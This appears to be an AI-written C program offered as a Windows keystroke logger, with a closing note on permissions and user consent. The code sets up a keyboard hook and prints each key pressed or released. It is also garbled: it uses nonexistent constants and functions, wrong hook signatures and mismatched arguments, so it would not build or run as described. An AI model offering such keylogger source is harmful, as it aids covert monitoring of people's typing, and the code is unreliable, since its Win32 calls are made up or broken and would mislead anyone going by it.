```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

LRESULT CALLBACK keyboardHook(int hwnd, int wEvent, uint32_t wParam, uint32_t lParam) {
    if (wEvent == WM_KEYDOWN || wEvent == WM_KEYUP) {
        char key = (char)wParam;
        printf("Key %s: %c\n", (wEvent == WM_KEYDOWN) ? "pressed" : "released", key);
    }
    return 0;
}

int main() {
    HWND hwnd = GetDesktopWindow();
    if (!hwnd) {
        CreateWindowEx(0, "Keystroke Logger", WS_OVERLAPPED | WS_VISIBLE, 0, 0, 0, 0, 0, HWND_DESKTOP, 0, 0, HWND_TOP, WS_EX_TOP);
    }

    int eventMask = 0;
    eventMask |= KEYBOARD_EVENT | KEYDOWN | KEYUP;

    int hHook = SetWindowsHook(eventMask, keyboardHook);

    if (hHook == 0) {
        printf("Failed to set keyboard hook.\n");
        return 0;
    }

    MSG msg;
    while (GetMessage(&msg, hHook)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            keyboardHook(msg.hwnd, msg.wParam, msg.lParam);
        }
    }

    UnhookWindowsHook(hHook);
    RemoveMessageQueue(hwnd);
    DestroyWindow(hwnd);

    return 0;
}
```

### Notes:
- **Permissions**: Ensure the application has the necessary permissions, especially if running as a non-administrator.
- **Legal Considerations**: Ensure you have the user's consent to monitor keystrokes.
